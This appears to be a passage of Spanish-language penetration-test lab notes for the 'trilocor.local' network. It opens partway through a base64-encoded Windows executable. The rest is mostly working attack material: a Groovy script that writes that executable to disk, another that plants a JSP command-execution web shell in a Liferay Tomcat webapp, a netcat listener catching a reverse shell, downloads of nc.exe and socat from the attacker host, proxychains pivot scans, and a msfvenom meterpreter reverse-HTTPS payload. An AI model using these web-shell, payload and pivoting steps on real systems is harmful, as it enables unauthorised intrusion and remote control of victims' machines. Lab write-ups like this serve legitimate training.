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' // (He acortado para el ejemplo)

// 1. Decodificamos a un array de bytes (esto mantiene la estructura del EXE intacta)
byte[] decodedBytes = Base64.getDecoder().decode(base64String.trim())

// 2. Definimos la ruta de salida
def outputPath = "C:\\Temp\\revv.exe"

// 3. Escribimos los BYTES directamente al archivo (SIN convertir a String)
def file = new File(outputPath)
file.setBytes(decodedBytes)

println "[+] EXE binario guardado correctamente en: " + outputPath
println "[+] Tamaño esperado: " + decodedBytes.length + " bytes"
```

![[Pasted image 20260122130520.png]]

![[Pasted image 20260122130528.png]]

```bash
root@WEB-DMZ01:~# iptables -I INPUT -p tcp --dport 443 -j ACCEPT
```

![[Pasted image 20260122130545.png]]

```bash
root@WEB-DMZ01:~# nc -nvlp 443
Listening on 0.0.0.0 443
Connection received on 172.16.139.35 59829
Microsoft Windows [Version 10.0.17763.6893]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Liferay\liferay-ce-portal-7.4.3.43-ga43\tomcat-9.0.56\bin>
```

```bash
Output

 Volume in drive C has no label.
 Volume Serial Number is DF59-CC7D

 Directory of C:\Liferay\liferay-ce-portal-7.4.3.43-ga43\tools\portal-tools-db-upgrade-client

09/21/2022  02:49 PM    <DIR>          .
09/21/2022  02:49 PM    <DIR>          ..
09/21/2022  02:47 PM             1,630 app-server.properties
09/21/2022  02:47 PM           292,535 com.liferay.portal.tools.db.upgrade.client.jar
09/21/2022  02:47 PM               130 db_upgrade.bat
09/21/2022  02:47 PM             1,546 db_upgrade.sh
09/21/2022  02:47 PM             1,756 portal-upgrade-database.properties
09/21/2022  02:47 PM                20 portal-upgrade-ext.properties
               6 File(s)        297,617 bytes
               2 Dir(s)  10,132,938,752 bytes free

```

contenido de `portal-upgrade-database.properties`
```sql
##
## DB2
##

    #jdbc.default.driverClassName=com.ibm.db2.jcc.DB2Driver
    #jdbc.default.url=jdbc:db2://localhost:50000/lportal:deferPrepares=false;fullyMaterializeInputStreams=true;fullyMaterializeLobData=true;progresssiveLocators=2;progressiveStreaming=2;
    #jdbc.default.username=db2admin
    #jdbc.default.password=lportal

##
## MariaDB
##

    #jdbc.default.driverClassName=org.mariadb.jdbc.Driver
    #jdbc.default.url=jdbc:mariadb://localhost/lportal?useUnicode=true&characterEncoding=UTF-8&useFastDateParsing=false
    #jdbc.default.username=
    #jdbc.default.password=

##
## MySQL
##

    #jdbc.default.driverClassName=com.mysql.cj.jdbc.Driver
    #jdbc.default.url=jdbc:mysql://localhost/lportal?characterEncoding=UTF-8&dontTrackOpenResources=true&holdResultsOpenOverStatementClose=true&serverTimezone=GMT&useFastDateParsing=false&useUnicode=true
    #jdbc.default.username=
    #jdbc.default.password=

##
## Oracle
##

    #jdbc.default.driverClassName=oracle.jdbc.OracleDriver
    #jdbc.default.url=jdbc:oracle:thin:@localhost:1521:xe
    #jdbc.default.username=lportal
    #jdbc.default.password=lportal
```


```bash
import java.util.Base64

// Tu base64 original
def base64String = 'PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT4KPCUKLy8KLy8gSlNQX0tJVAovLwovLyBjbWQuanNwID0gQ29tbWFuZCBFeGVjdXRpb24gKHVuaXgpCi8vCi8vIGJ5OiBVbmtub3duCi8vIG1vZGlmaWVkOiAyNy8wNi8yMDAzCi8vCiU+CjxIVE1MPjxCT0RZPgo8Rk9STSBNRVRIT0Q9IkdFVCIgTkFNRT0ibXlmb3JtIiBBQ1RJT049IiI+CjxJTlBVVCBUWVBFPSJ0ZXh0IiBOQU1FPSJjbWQiPgo8SU5QVVQgVFlQRT0ic3VibWl0IiBWQUxVRT0iU2VuZCI+CjwvRk9STT4KPHByZT4KPCUKaWYgKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKSAhPSBudWxsKSB7CiAgICAgICAgb3V0LnByaW50bG4oIkNvbW1hbmQ6ICIgKyByZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikgKyAiPEJSPiIpOwogICAgICAgIFByb2Nlc3MgcCA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKTsKICAgICAgICBPdXRwdXRTdHJlYW0gb3MgPSBwLmdldE91dHB1dFN0cmVhbSgpOwogICAgICAgIElucHV0U3RyZWFtIGluID0gcC5nZXRJbnB1dFN0cmVhbSgpOwogICAgICAgIERhdGFJbnB1dFN0cmVhbSBkaXMgPSBuZXcgRGF0YUlucHV0U3RyZWFtKGluKTsKICAgICAgICBTdHJpbmcgZGlzciA9IGRpcy5yZWFkTGluZSgpOwogICAgICAgIHdoaWxlICggZGlzciAhPSBudWxsICkgewogICAgICAgICAgICAgICAgb3V0LnByaW50bG4oZGlzcik7IAogICAgICAgICAgICAgICAgZGlzciA9IGRpcy5yZWFkTGluZSgpOyAKICAgICAgICAgICAgICAgIH0KICAgICAgICB9CiU+CjwvcHJlPgo8L0JPRFk+PC9IVE1MPgoK' 

// 1. Decodificamos a bytes
byte[] decodedBytes = Base64.getDecoder().decode(base64String)

// 2. IMPORTANTE: Convertimos de UTF-16LE a un String normal de Java/Groovy
// Esto elimina los espacios (bytes nulos) que estás viendo
def scriptLimpio = new String(decodedBytes, "UTF-16LE")

// 3. Ahora guardamos el script ya limpio
def outputPath = "C:\\Liferay\\liferay-ce-portal-7.4.3.43-ga43\\tomcat-9.0.56\\webapps\\ROOT\\shell.jsp"
new File(outputPath).write(scriptLimpio, "UTF-8")

println "Archivo guardado sin espacios en: " + outputPath
```

```bash
C:\\Liferay\\liferay-ce-portal-7.4.3.43-ga43\\tomcat-9.0.56\\webapps\\ROOT\\
```


```bash
websvc@WEB-DMZ01:/var/www/html/wp-content/uploads/wpforms$ wget 10.10.16.63/nc.exe -O /tmp/nc.exe
--2026-01-21 19:10:13--  http://10.10.16.63/nc.exe
Connecting to 10.10.16.63:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 38616 (38K) [application/x-msdos-program]
Saving to: '/tmp/nc.exe'

/tmp/nc.exe                                  100%[==============================================================================================>]  37.71K  63.6KB/s    in 0.6s    

2026-01-21 19:10:15 (63.6 KB/s) - '/tmp/nc.exe' saved [38616/38616]
```


```bash
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:05:03.112518 IP trilocor.local > 10.10.16.63: ICMP echo request, id 14392, seq 1, length 56
14:05:03.112542 IP 10.10.16.63 > trilocor.local: ICMP echo reply, id 14392, seq 1, length 56
^C
2 packets captured
2 packets received by filter
0 packets dropped by kernel
```


```bash
proxychains nmap -sT -p21,2121 -sCV 172.16.139.10 -Pn
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-21 13:55 -0500
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:44444  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:56285  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:21  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.139.10:2121  ...  OK
Nmap scan report for 172.16.139.10
Host is up (0.00s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.16.139.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
2121/tcp open  ftp
|_ftp-bounce: bounce working!
| fingerprint-strings: 
|   GenericLines, NULL, SMBProgNeg: 
|     220 uftpd (2.8) ready.
|   Help: 
|     220 uftpd (2.8) ready.
|     214-The following commands are recognized.
|     ABOR DELE USER PASS SYST TYPE PORT EPRT RETR MKD RMD REST MDTM PASV
|     EPSV QUIT LIST NLST MLST MLSD CLNT OPTS PWD STOR CWD CDUP SIZE NOOP
|     HELP FEAT
|     Help OK.
|   SSLSessionReq: 
|     220 uftpd (2.8) ready.
|     command '
|_    recognized by server.
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port2121-TCP:V=7.98%I=7%D=1/21%Time=6971212B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,18,"220\x20uftpd\x20\(2\.8\)\x20ready\.\r\n")%r(GenericLines,18,"220
SF:\x20uftpd\x20\(2\.8\)\x20ready\.\r\n")%r(Help,EA,"220\x20uftpd\x20\(2\.
SF:8\)\x20ready\.\r\n214-The\x20following\x20commands\x20are\x20recognized
SF:\.\r\n\x20ABOR\x20DELE\x20USER\x20PASS\x20SYST\x20TYPE\x20PORT\x20EPRT\
SF:x20RETR\x20MKD\x20RMD\x20REST\x20MDTM\x20PASV\r\n\x20EPSV\x20QUIT\x20LI
SF:ST\x20NLST\x20MLST\x20MLSD\x20CLNT\x20OPTS\x20PWD\x20STOR\x20CWD\x20CDU
SF:P\x20SIZE\x20NOOP\r\n\x20HELP\x20FEAT\r\n214\x20Help\x20OK\.\r\n")%r(SS
SF:LSessionReq,44,"220\x20uftpd\x20\(2\.8\)\x20ready\.\r\n500\x20command\x
SF:20'\x16\x03'\x20not\x20recognized\x20by\x20server\.\r\n")%r(SMBProgNeg,
SF:18,"220\x20uftpd\x20\(2\.8\)\x20ready\.\r\n");
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.97 seconds
```

```bash
websvc@WEB-DMZ01:/tmp$ wget http://10.10.16.63/socat 
--2026-01-21 19:44:51--  http://10.10.16.63/socat
Connecting to 10.10.16.63:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 514288 (502K) [application/octet-stream]
Saving to: 'socat'

socat                                        100%[==============================================================================================>] 502.23K   339KB/s    in 1.5s    

2026-01-21 19:44:53 (339 KB/s) - 'socat' saved [514288/514288]

websvc@WEB-DMZ01:/tmp$ chmod +x socat
```

```bash
 git clone https://github.com/aledbf/socat-static-binary                                              
Cloning into 'socat-static-binary'...
remote: Enumerating objects: 14, done.
remote: Total 14 (delta 0), reused 0 (delta 0), pack-reused 14 (from 1)
Receiving objects: 100% (14/14), 6.69 KiB | 6.69 MiB/s, done.
Resolving deltas: 100% (2/2), done.
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/CPTS]
└─# cd socat-static-binary 
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/CPTS/socat-static-binary]
└─# make all   
docker build -t socat-static-build .
[+] Building 14.1s (6/8)                                                                                                                                                     docker:default
 => [internal] load build definition from Dockerfile                                                                                                                                   0.0s
 => => transferring dockerfile: 514B                                                                                                                                                   0.0s
 => [internal] load metadata for docker.io/library/debian:jessie                                                                                                                       2.7s
 => [internal] load .dockerignore                                                                                                                                                      0.0s
 => => transferring context: 2B                                                                                                                                                        0.0s
 => [1/4] FROM docker.io/library/debian:jessie@sha256:32ad5050caffb2c7e969dac873bce2c370015c2256ff984b70c1c08b3a2816a0                                                                 5.8s
 => => resolve docker.io/library/debian:jessie@sha256:32ad5050caffb2c7e969dac873bce2c370015c2256ff984b70c1c08b3a2816a0                                                                 0.0s
 => => sha256:32ad5050caffb2c7e969dac873bce2c370015c2256ff984b70c1c08b3a2816a0 982B / 982B                                                                                             0.0s
 => => sha256:23f6c1ca631220b4a17c659e70e4c20092965590b406b1fb02780475680622f4 529B / 529B                                                                                             0.0s
 => => sha256:3aaeab7a47777b5ca21fc6de40a6f9e7ee7ebb7302e7a025795eb9e73200c404 1.46kB / 1.46kB                                                                                         0.0s
 => => sha256:b82b9923b08dfd4c2a83d1669b67a3a0c12f2d17fc989315c05f201eabc33b52 54.39MB / 54.39MB                                                                                       2.5s
 => => extracting sha256:b82b9923b08dfd4c2a83d1669b67a3a0c12f2d17fc989315c05f201eabc33b52                                                                                              3.3s
 => [internal] load build context                                                                                                                                                      0.0s
 => => transferring context: 53.51kB                                                                                                                                                   0.0s 
 => ERROR [2/4] RUN apt-get update   && apt-get upgrade -yy   && apt-get install -yy     automake     build-essential     curl     git      pkg-config     libwrap0-dev     linux-lib  5.5s 
------                                                                                                                                                                                      
 > [2/4] RUN apt-get update   && apt-get upgrade -yy   && apt-get install -yy     automake     build-essential     curl     git      pkg-config     libwrap0-dev     linux-libc-dev   && apt-get clean:                                                                                                                                                                                 
0.816 Ign http://security.debian.org jessie/updates InRelease                                                                                                                               
0.841 Ign http://deb.debian.org jessie InRelease                                                                                                                                            
1.066 Ign http://deb.debian.org jessie-updates InRelease                                                                                                                                    
1.281 Ign http://security.debian.org jessie/updates Release.gpg
1.282 Ign http://deb.debian.org jessie Release.gpg
1.493 Ign http://deb.debian.org jessie-updates Release.gpg
1.705 Ign http://deb.debian.org jessie Release
1.723 Ign http://security.debian.org jessie/updates Release
1.917 Ign http://deb.debian.org jessie-updates Release
1.959 Err http://security.debian.org jessie/updates/main amd64 Packages
1.959   
2.407 Err http://security.debian.org jessie/updates/main amd64 Packages
2.407   
2.873 Err http://security.debian.org jessie/updates/main amd64 Packages
2.873   
3.324 Err http://security.debian.org jessie/updates/main amd64 Packages
3.324   
3.778 Err http://security.debian.org jessie/updates/main amd64 Packages
3.778   404  Not Found [IP: 151.101.130.132 80]
3.854 Err http://deb.debian.org jessie/main amd64 Packages
3.854   404  Not Found
4.071 Err http://deb.debian.org jessie-updates/main amd64 Packages
4.071   404  Not Found
4.077 W: Failed to fetch http://deb.debian.org/debian/dists/jessie/main/binary-amd64/Packages  404  Not Found
4.077 
4.077 W: Failed to fetch http://security.debian.org/debian-security/dists/jessie/updates/main/binary-amd64/Packages  404  Not Found [IP: 151.101.130.132 80]
4.077 
4.077 W: Failed to fetch http://deb.debian.org/debian/dists/jessie-updates/main/binary-amd64/Packages  404  Not Found
4.077 
4.077 E: Some index files failed to download. They have been ignored, or old ones used instead.
------

 6 warnings found (use docker --debug to expand):
 - LegacyKeyValueFormat: "ENV key=value" should be used instead of legacy "ENV key value" format (line 20)                                                                                  
 - LegacyKeyValueFormat: "ENV key=value" should be used instead of legacy "ENV key value" format (line 21)
 - LegacyKeyValueFormat: "ENV key=value" should be used instead of legacy "ENV key value" format (line 22)
 - LegacyKeyValueFormat: "ENV key=value" should be used instead of legacy "ENV key value" format (line 23)
 - LegacyKeyValueFormat: "ENV key=value" should be used instead of legacy "ENV key value" format (line 24)
 - JSONArgsRecommended: JSON arguments recommended for CMD to prevent unintended behavior related to OS signals (line 28)
Dockerfile:5
--------------------
   4 |     
   5 | >>> RUN apt-get update \
   6 | >>>   && apt-get upgrade -yy \
   7 | >>>   && apt-get install -yy \
   8 | >>>     automake \
   9 | >>>     build-essential \
  10 | >>>     curl \
  11 | >>>     git  \
  12 | >>>     pkg-config \
  13 | >>>     libwrap0-dev \
  14 | >>>     linux-libc-dev \
  15 | >>>   && apt-get clean
  16 |     
--------------------
ERROR: failed to solve: process "/bin/sh -c apt-get update   && apt-get upgrade -yy   && apt-get install -yy     automake     build-essential     curl     git      pkg-config     libwrap0-dev     linux-libc-dev   && apt-get clean" did not complete successfully: exit code: 100
make: *** [Makefile:7: build] Error 1
```

```bash
git clone https://github.com/andrew-d/static-binaries/                                 
Cloning into 'static-binaries'...
remote: Enumerating objects: 574, done.
remote: Counting objects: 100% (37/37), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 574 (delta 28), reused 26 (delta 26), pack-reused 537 (from 1)
Receiving objects: 100% (574/574), 65.36 MiB | 31.48 MiB/s, done.
Resolving deltas: 100% (236/236), done.
Updating files: 100% (128/128), done.
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/zs1n/Desktop/CPTS]
└─# cd static-binaries/binaries/linux/x86_64 
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/…/static-binaries/binaries/linux/x86_64]
└─# ls
ag  heartbleeder  ld         nano  nm    nmap_centos5  objcopy  p0f     python2.7      ranlib   size   strings  yasm
ar  ht            lsciphers  ncat  nmap  nping         objdump  python  python2.7.zip  readelf  socat  vsyasm   ytasm
                                                                                                                                                                                            
┌──(root㉿kali)-[/home/…/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.5.216 - - [21/Jan/2026 14:49:00] "GET /socat HTTP/1.1" 200 -

```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.139.10 LPORT=443 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 714 bytes
Final size of exe file: 7680 bytes
Saved as: rev.exe
```
## shop.trilocor.local

